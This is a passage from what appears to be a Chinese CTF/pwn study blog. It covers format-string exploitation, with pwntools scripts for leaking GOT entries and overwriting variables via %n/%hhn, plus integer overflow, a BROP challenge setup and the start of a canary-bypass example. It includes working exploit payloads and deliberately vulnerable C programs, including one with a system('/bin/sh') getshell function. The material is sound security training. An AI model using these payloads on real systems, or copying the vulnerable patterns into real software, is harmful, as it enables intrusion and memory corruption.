<p>运行过程中程序先将printf的参数全部入栈<code>&quot;%08x.%08x.%08x.%s\n&quot;</code>,<code>a</code>, <code>b</code>,<code>c</code>,<code>s</code>四个参数，然后对<code>&quot;%08x.%08x.%08x.%s\n&quot;</code>进行输出，遇到<code>%</code>将对应参数进行解析，每一个参数都是将栈上后一个参数按对应格式输出</p>
<p><code>%08x.%08x.%08x.%s\n</code> 这是 printf 函数的第一个参数：格式化字符串，printf 函数会根据这个字符串来解析后面的参数</p>
<p>第一个 %08x 解析的是 0x1，也就是源码里面的 a，第二个 %08x 解析的是 0x22222222，peda 显示的有些问题，但是通过 x&#x2F;wx 0xffffce18 看出来的确实是之前源码里面的 b，第三个 %08x 解析的是 0xffffffff，也就是参数 c：-1，后面的 %s 会把我们输入的内容，也就是 %08x.%08x.%08x 给打印出来</p>
<p>我们执行 c 让程序继续运行，看一下结果</p>
<p><img src="/2024/03/15/CTF/image-20240416233756895.png" alt="image-20240416233756895"></p>
<p>结果跟我们想的一样，同时程序断在了第二个 printf 这里，把我们之前输入的内容作为 格式化字符串，但是这一次没有给他提供其他的参数，但是他同样会在栈上找临近的三个参数，根据 格式化字符串 给打印出来，这样就把他后面三个栈上的值给输出出来了</p>
<p><img src="/2024/03/15/CTF/image-20240416234051662.png" alt="image-20240416234051662"></p>
<p>但是上面的都是获取临近的内容进行输出，我们不可能只要这几个东西，可以通过 %n$x 来获取被视作第 n+1 个参数的值（格式化字符串是第一个参数）</p>
<p>那上个例子来说，如果使用 %3$x 就会打印出第四个参数对应的值</p>
<p>小技巧总结</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别</span><br><span class="line"></span><br><span class="line">利用 %s 来获取变量所对应地址的内容，只不过有零截断</span><br><span class="line"></span><br><span class="line">利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容</span><br></pre></td></tr></table></figure>

<h3 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h3><p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容 <code>addr%k$x</code></p>
<p>下面就是确定格式化字符串是第几个参数了，一般可以通过 [tag]%p%p%p%p%p%p%p%p%p 来实现，如果输出的内容跟我们前面的 tag 重复了，那就说明我们找到了，但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试</p>
<p>使用 objdump -R fs1 查看一下 got 表</p>
<p><img src="/2024/03/15/CTF/image-20240416235535805.png" alt="image-20240416235535805"></p>
<p>通过这段代码，可以把 scanf 的地址给打印出来，%s 是把地址指向的内存内容给打印出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./fs1&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line">elf = ELF(program)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;scanf: &quot;</span>, <span class="built_in">hex</span>(__isoc99_scanf_got))</span><br><span class="line"></span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">b&#x27;%4$s&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span>, payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;%4$s\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__isoc99_scanf_got: &quot;</span>, <span class="built_in">hex</span>(u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2024/03/15/CTF/image-20240417000659258.png" alt="image-20240417000659258">需要注意的是不能直接在命令行输入 \x14\xa0\x0%4$s 否则 scanf 会把它识别成：\，x，1，4….</p>
<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><p>%n，不输出字符，但是把已经成功输入的字符个数写入对应的整型指针参数所指的变量</p>
<p>只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值</p>
<p>一般来说，利用分为以下的步骤：</p>
<ul>
<li>确定覆盖地址</li>
<li>确定相对偏移</li>
<li>进行覆盖</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified c.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified a for a small number.&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;modified b for a big number!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于覆盖偏移的话可以通过测试得出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure>

<p>可以得到，是格式化字符串的第 6 个参数</p>
<p><img src="/2024/03/15/CTF/image-20240417003252995.png" alt="image-20240417003252995"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"><span class="comment"># 地址要以10进制的格式传入，在栈上自动转为16进制</span></span><br><span class="line">c_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_addr: &quot;</span>, <span class="built_in">hex</span>(c_addr))</span><br><span class="line"><span class="comment"># 要使c=16,我们要写入16个字节的内容,%n计算已经写入的长度</span></span><br><span class="line"><span class="comment"># 这里p32()是4字节，12个a然后&#x27;%6$n&#x27;代表，向第6个参数写入长度</span></span><br><span class="line">payload = p32(c_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>由上面知道我们最少也要输入一个内存地址，所以覆盖的最小值为4，我们如何覆盖比4还小的数呢。</p>
<p><code>aa%k$nxx</code>，如果用这样的方式，前面 <code>aa%k</code> (4个字节)是第六个参数，<code>$nxx</code> （4个字节）是第七个参数，后面在跟一个 我们想要修改的地址，那么这个地址就是第八个参数，只需要把 k 改成 8 就可以把这第八个参数改成 2，<code>aa%8$nxx</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"></span><br><span class="line">a_addr = <span class="number">0x804C018</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/15/CTF/image-20240417010211247.png" alt="image-20240417010211247"></p>
<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数</span><br><span class="line">hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</span><br></pre></td></tr></table></figure>

<p>意思是说：hhn 写入的就是单字节，hn 写入的就是双字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"></span><br><span class="line">b_addr = <span class="number">0x804C01C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向四个地址写入长度，但是每个地址只写一个字节</span></span><br><span class="line">payload = p32(b_addr) + p32(b_addr + <span class="number">1</span>) + p32(b_addr + <span class="number">2</span>) + p32(b_addr + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%104x&#x27;</span> + <span class="string">b&#x27;%6$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%7$hhn&#x27;</span>+ <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%8$hhn&#x27;</span>+ <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(fmtstr_payload(6, &#123;0x804C01C:0x12345678&#125;))</span></span><br><span class="line"><span class="comment"># pwntools带着一个函数,很方便</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>前面的那一串 p32()，每算是 4 字符，这样到 %6$hhn 前面就是：16+104&#x3D;120，也就是 0x78</p>
<p>再加上 222 就是 342，也就是 0x156，然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678</p>
<p><img src="/2024/03/15/CTF/image-20240417134526355.png" alt="image-20240417134526355"></p>
<h3 id="x64格式化字符串"><a href="#x64格式化字符串" class="headerlink" title="x64格式化字符串"></a>x64格式化字符串</h3><p>在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code> 传递；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code> 和 <code>R9</code> 来传递。</p>
<p>我们最后的输出中，前五个数字分别来自寄存器 <code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code>，后面的数字才取自栈，<code>0x4141414141414141</code> 在 <code>%8$p</code> 的位置。这里还有个地方要注意，我们前面说的 Linux 有 6 个寄存器用于传递参数，可是这里只输出了 5 个，原因是有一个寄存器 <code>RDI</code> 被用于传递格式字符串，可以从 gdb 中看到，<code>arg[0]</code> 就是由 <code>RDI</code> 传递的格式字符串。（现在你可以再回到 x86 的相关内容，可以看到在 x86 中格式字符串通过栈传递的，但是同样的也不会被打印出来）其他的操作和 x86 没有什么大的区别，只是这时我们就不能修改 <code>arg2</code> 的值了，因为它被存入了寄存器中。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2599">HUBUCTF 2022 新生赛]fmt | NSSCTF</a></p>
<p><img src="/2024/03/15/CTF/image-20240426213558131.png" alt="image-20240426213558131"></p>
<p>可以利用格式化字符串漏洞</p>
<p>使用gdb调试，输入<code>aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code><img src="/2024/03/15/CTF/image-20240426213727735.png" alt="image-20240426213727735"></p>
<p>发现输入位置在第8个</p>
<p>ida查看得知<img src="/2024/03/15/CTF/image-20240426213850847.png" alt="image-20240426213850847"></p>
<p>我们输入的位置在format上，而flag的内容在s上，两者相隔0x20，</p>
<p>所以flag的位置在<code>(0x60 - 0x40) / 8 + 8</code>，是在第12个</p>
<h3 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h3><p><code>FmtStr</code> 提供了自动化的字符串漏洞利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</span><br></pre></td></tr></table></figure>

<ul>
<li>execute_fmt (function)：与漏洞进程进行交互的函数</li>
<li>offset (int)：你控制的第一个格式化程序的偏移量</li>
<li>padlen (int)：在 paylod 之前添加的 pad 的大小</li>
<li>numbwritten (int)：已经写入的字节数</li>
</ul>
<p><code>fmtstr_payload</code> 用于自动生成格式化字符串 paylod：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br></pre></td></tr></table></figure>

<ul>
<li>offset (int)：你控制的第一个格式化程序的偏移量</li>
<li>writes (dict)：格式为 {addr: value, addr2: value2}，用于往 addr 里写入 value 的值（常用：{printf_got}）</li>
<li>numbwritten (int)：已经由 printf 函数写入的字节数</li>
<li>write_size (str)：必须是 byte，short 或 int。告诉你是要逐 byte 写，逐 short 写还是逐 int 写（hhn，hn或n）</li>
</ul>
<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>关于整数的异常情况主要有三种：</p>
<ul>
<li>溢出<ul>
<li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li>
<li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li>
</ul>
</li>
<li>回绕<ul>
<li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li>
<li>进位标志 <code>CF</code> 可检测无符号数的回绕</li>
</ul>
</li>
<li>截断<ul>
<li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li>
</ul>
</li>
</ul>
<h3 id="有符号整数溢出"><a href="#有符号整数溢出" class="headerlink" title="有符号整数溢出"></a>有符号整数溢出</h3><ul>
<li>上溢出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">i = INT_MAX;  // 2 147 483 647</span><br><span class="line">i++;</span><br><span class="line">printf(&quot;i = %d\n&quot;, i);  // i = -2 147 483 648</span><br></pre></td></tr></table></figure>

<ul>
<li>下溢出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = INT_MIN;  // -2 147 483 648</span><br><span class="line">i--;</span><br><span class="line">printf(&quot;i = %d\n&quot;, i);  // i = 2 147 483 647</span><br></pre></td></tr></table></figure>

<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack vuln.c</span><br></pre></td></tr></table></figure>



<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p><a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.1_pwn_hctf2016_brop">6.1.1 pwn HCTF2016 brop | CTF-All-In-One (gitbook.io)</a></p>
<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>出题人在 github 上开源了代码，<a target="_blank" rel="noopener" href="https://github.com/zh-explorer/hctf2016-brop">出题人失踪了</a>。如下：</p>
<p>Copy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">int check();</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line"></span><br><span class="line">    puts(&quot;WelCome my friend,Do you know password?&quot;);</span><br><span class="line">        if(!check()) &#123;</span><br><span class="line">            puts(&quot;Do not dump my memory&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            puts(&quot;No password, no game&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int check() &#123;</span><br><span class="line">    char buf[50];</span><br><span class="line">    read(STDIN_FILENO, buf, 1024);</span><br><span class="line">    return strcmp(buf, &quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用下面的语句编译，然后运行起来：</p>
<p>Copy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -z noexecstack -fno-stack-protector -no-pie brop.c</span><br></pre></td></tr></table></figure>

<p>checksec 如下：</p>
<p>Copy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ checksec -f a.out</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               2       a.out</span><br></pre></td></tr></table></figure>

<p>由于 socat 在程序崩溃时会断开连接，我们写一个小脚本，让程序在崩溃后立即重启，这样就模拟出了远程环境 <code>127.0.0.1:10001</code>：</p>
<p>Copy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">while true; do</span><br><span class="line">        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`</span><br><span class="line">        if [ $num -lt 5 ]; then</span><br><span class="line">                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &amp;</span><br><span class="line">        fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>在一个单独的 shell 中运行它，这样我们就简单模拟出了比赛时的环境，即仅提供 ip 和端口。（不停地断开重连特别耗CPU，建议在服务器上跑）</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的 64-bit Linux。</p>
<p>实现这一攻击有两个必要条件：</p>
<ol>
<li>目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它</li>
<li>目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。</li>
</ol>
<p>下面我们结合题目来讲一讲。</p>
<h4 id="找到栈溢出漏洞"><a href="#找到栈溢出漏洞" class="headerlink" title="找到栈溢出漏洞"></a>找到栈溢出漏洞</h4><p>首先是要找到栈溢出的漏洞，老办法从 1 个字符开始，暴力枚举，直到它崩溃。</p>
<h4 id="stop-gadget"><a href="#stop-gadget" class="headerlink" title="stop gadget"></a>stop gadget</h4><p>在寻找通用 gadget 之前，我们需要一个 stop gadget。一般情况下，当我们把返回地址覆盖后，程序有很大的几率会挂掉，因为所覆盖的地址可能并不是合法的，所以我们需要一个能够使程序正常返回的地址，称作 stop gadget，这一步至关重要。stop gadget 可能不止一个，这里我们之间返回找到的第一个好了：</p>
<h2 id="canary绕过"><a href="#canary绕过" class="headerlink" title="canary绕过"></a>canary绕过</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Morphy_Amo/article/details/122120696">【pwn学习】Canary的各种绕过姿势_pwn canary绕过-CSDN博客</a></p>
<p>下面的<code>exp.py</code>都是用上面文章中的例子</p>
<h3 id="方法一-覆盖截断字符获取Canary"><a href="#方法一-覆盖截断字符获取Canary" class="headerlink" title="方法一 覆盖截断字符获取Canary"></a>方法一 覆盖截断字符获取Canary</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>Canary设计其低字节为\x00，本意是阻止被read、write等函数直接将Canary读出来。通过栈溢出将低位的\x00覆写，就可以读出Canary的值。</p>
<p>从上面的分析，我们可以梳理出绕过的思路：</p>
<p>构造第一次溢出，覆写Canary低字节\x00，读取出Canary值<br>构造第二次溢出，利用获取的Canary重新构造payload，获取shell。</p>
<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span 